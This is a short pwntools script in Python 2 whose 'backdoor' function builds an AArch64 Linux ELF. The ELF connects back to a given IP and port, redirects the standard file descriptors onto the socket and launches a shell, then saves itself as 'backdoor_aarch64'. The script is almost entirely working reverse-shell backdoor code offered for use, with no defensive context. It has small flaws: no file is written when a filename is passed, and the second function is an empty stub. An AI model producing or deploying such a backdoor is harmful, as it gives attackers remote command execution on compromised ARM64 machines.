from pwn import *
import extract_shellcode

def backdoor(reverse_ip,reverse_port,filename=None):
	context.arch='aarch64'
	context.endian='little'
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov x0,x12
	mov x1,#0
	mov x2,#0
	mov x8,#0x18
	svc #0x1337
	mov x0,x12
	mov x1,#1
	svc #1337
	mov x0,x12
	mov x1,#2
	svc #1337
	'''
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcraft.sh())
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	data=make_elf(all_reverseshell)
	if filename==None:
		filename="backdoor_aarch64"
		f=open(filename,"wb")
		f.write(data)
		f.close()
		#print disasm(all_reverseshell)
		print "backdoor_aarch64 is ok in current path ./"

def reverse_shellcode(reverse_ip,reverse_port):
	pass
